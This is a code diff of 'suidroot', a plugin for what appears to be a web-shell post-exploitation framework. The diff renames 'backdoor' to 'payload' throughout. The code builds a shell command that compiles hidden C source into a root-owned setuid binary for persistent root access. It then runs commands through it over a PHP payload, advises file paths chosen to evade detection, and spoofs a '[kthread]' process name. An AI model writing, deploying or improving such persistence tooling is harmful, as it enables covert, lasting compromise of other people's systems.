@@ -18,27 +18,27 @@
 #        You should have received a copy of the GNU General Public License
 #        along with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-"""Setuid backdoor handler.
+"""Setuid payload handler.
 
 USAGE:
-    suidroot --create <backdoor>
+    suidroot --create <payload>
     suidroot <command>
 
 DESCRIPTION:
     Provide a simple way to install persistent setuid(2)
-    backdoor from previously obtained root access.
+    payload from previously obtained root access.
 
-    SUIDROOT_BACKDOOR file should be carefully chosen to not
+    SUIDROOT_PAYLOAD file should be carefully chosen to not
     look suspicious. Our goal is to make it as undetectable
     as we can. I recommend searching for legitimate setuid()
     files already installed on the system, and using a
-    similar file path as SUIDROOT_BACKDOOR.
+    similar file path as SUIDROOT_PAYLOAD.
 
 LIMITATIONS:
     - Only works on Linux/UNIX.
     - RCE must be available (`run` plugin must work).
     - Current (unprivileged) user must have execution
-    rights on backdoor file.
+    rights on payload file.
 
 WARNING:
     Considering Omega's input parser, commands which
@@ -55,7 +55,7 @@ WARNING:
     > suidroot "echo 'foo bar' > /tmp/foobar; cat /etc/passwd"
 
 EXAMPLES:
-    > suidroot --create /tmp/backdoor
+    > suidroot --create /tmp/payload
       - Generates the payload to be run as root in order
         to enable persistance through Omega
     > suidroot cat /tmp/shadow
@@ -64,8 +64,8 @@ EXAMPLES:
       - Show your current user and id (enjoy!)
 
 ENVIRONMENT:
-    * SUIDROOT_BACKDOOR
-        The setuid(2) backdoor file
+    * SUIDROOT_PAYLOAD
+        The setuid(2) payload file
     * SUIDROOT_PWD
         Current working directory for privileged user
 """
@@ -83,7 +83,7 @@ from api import plugin
 from api import server
 from api import environ
 
-SUIDROOT_ENV_VARS = {"SUIDROOT_BACKDOOR", "SUIDROOT_PWD"}
+SUIDROOT_ENV_VARS = {"SUIDROOT_PAYLOAD", "SUIDROOT_PWD"}
 
 if environ["PLATFORM"].lower().startswith("win"):
     sys.exit("Plugin available on unix-based platforms only")
@@ -95,17 +95,17 @@ if plugin.argv[1] == '--create':
     if len(plugin.argv) != 3:
         sys.exit(plugin.help)
 
-    backdoor_file = server.path.abspath(plugin.argv[2])
+    payload_file = server.path.abspath(plugin.argv[2])
 
     # create the payload that must be run as privileged used.
-    # The suidroot backdoor is then created with suid byte
+    # The suidroot payload is then created with suid byte
     # enabled, making tunnel available.
-    file = open(os.path.join(plugin.path, "backdoor.c"), 'rb')
+    file = open(os.path.join(plugin.path, "payload.c"), 'rb')
     source_code = encoding.decode(base64.b64encode(file.read()))
     payload = ("echo %b | python -m base64 -d | gcc -o %f -x c -;"
                "chown root %f;"
                "chmod 4755 %f;"
-               ).replace('%f', backdoor_file).replace('%b', source_code)
+               ).replace('%f', payload_file).replace('%b', source_code)
 
     # prevent previous configuration override
     if SUIDROOT_ENV_VARS.issubset(set(environ)):
@@ -117,7 +117,7 @@ if plugin.argv[1] == '--create':
           "run the following shell payload AS ROOT on the remote system:")
     print(ui.color.colorize("\n", "%Blue", payload, "\n"))
 
-    environ['SUIDROOT_BACKDOOR'] = backdoor_file
+    environ['SUIDROOT_PAYLOAD'] = payload_file
     environ['SUIDROOT_PWD'] = environ['PWD']
     sys.exit()
 
@@ -141,8 +141,8 @@ command += "echo ; echo suid `pwd` suid"
 
 # build the payload to send the command to run on system
 payload = server.payload.Payload("payload.php")
-# prepend slashes, so backdoor can spoof it's name with fake '[kthread]' str
-payload['BACKDOOR'] = "/////////" + environ['SUIDROOT_BACKDOOR']
+# prepend slashes, so payload can spoof it's name with fake '[kthread]' str
+payload['PAYLOAD'] = "/////////" + environ['SUIDROOT_PAYLOAD']
 payload['COMMAND'] = repr(command)
 
 print("[v] raw command: %r" % command)
